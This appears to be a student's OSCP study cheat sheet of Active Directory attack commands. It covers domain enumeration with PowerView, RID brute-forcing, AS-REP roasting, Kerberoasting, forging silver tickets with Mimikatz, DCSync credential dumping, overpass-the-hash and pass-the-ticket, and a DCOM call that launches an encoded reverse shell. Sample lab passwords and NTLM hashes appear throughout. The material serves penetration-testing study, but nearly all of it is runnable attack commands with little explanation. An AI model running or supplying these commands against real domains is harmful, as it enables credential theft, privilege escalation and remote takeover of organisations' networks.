Whenever you gain access to a domain user or dc01 attempt running these cmds.

TRY ALL CMDS in NXC and CMAPEXEC FIRST

MOST PROBABLE FOR WORKING, this is material from oscp study guide. "22 Active Directory Enumeration."

certutil the PowerView.ps1 and refer to documentation for cmd usage.

Get-NetUser | select cn -- all users

Get-NetGroup | select cn -- all groups

Get-NetComputer | select operatingsystem,dnshostname,operatingsystemversion -- all machines in domain

Get-NetSession -ComputerName files04 -Verbose -- See users logged into particular machine

Get-NetUser -SPN | select samaccountname,serviceprincipalname -- get a list of user spns

Get-ObjectAcl -Identity stephanie --  see ad rights

Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104 -- Convert sid to name

Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights --  See which sids have GenericAll rights to certain group.

Find-DomainShare



MOST PROBABLE FOR WORKING EXPLOITATION, material from "23 Attacking AD auth"


RID-BRUTING

netexec smb dc01 -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | tee users

AS-REP ROASTING

GetNPUsers.py oscp.exam/eric.wallows/EricLikesRunning800 -usersfile users -format hashcat -outputfile hashes.aspreroast -dc-ip dc01 -- TRY WITH AND WITHOUT USERS

KERBEROASTING

GetUserSPNs.py -request DOMAIN/username:password -dc-ip dc01 

SILVER TICKETS

Now that we have collected all three pieces of information, we can build the command to create a silver ticket with Mimikatz. We can create the forged service ticket with the kerberos::golden module. This module provides the capabilities for creating golden and silver tickets alike. We'll explore the concept of golden tickets in the Module Lateral Movement in Active Directory.

We need to provide the domain SID (/sid:), domain name (/domain:), and the target where the SPN runs (/target:). We also need to include the SPN protocol (/service:), NTLM hash of the SPN (/rc4:), and the /ptt option, which allows us to inject the forged ticket into the memory of the machine we execute the command on.

Finally, we must enter an existing domain user for /user:. This user will be set in the forged ticket. For this example, we'll use jeffadmin. However, we could also use any other domain user since we can set the permissions and groups ourselves.

The complete command can be found in the following listing:

kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin

DCSYNC

lsadump::dcsync /user:corp\<user>

impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70


"24. LATERAL MOVEMENT IN ACTIVE DIRECTORY."

Should be able to setup a ligolo proxy and run cmds like nxc smb -X to attemp psexec wmiexec and other auth techniques.

OVERPASS THE HASH

sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell

PASS THE TICKET

useful when you want to access internal resources

sekurlsa::tickets /export

ON PWNDED SHELL

dir *.kirbi

kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi -- establishes ticket

klist -- confirms the attack worked -- should be able to now access internal resources

DCOM

$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<myip>"))

$dcom.Document.ActiveView.ExecuteShellCommand(<myencodedrevshellfrom-/OSCPMETHOD/Ad-Section/revshells)

MISC CMDS

certipy find -vulnerable -u judith.mader -p judith09 -dc-ip <domainip> -stdout

GetNPUsers.py '<DOMAIN-DOMAIN.DOMAIN/> "ex. EGOTISTICAL-BANK.LOCAL/"' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast

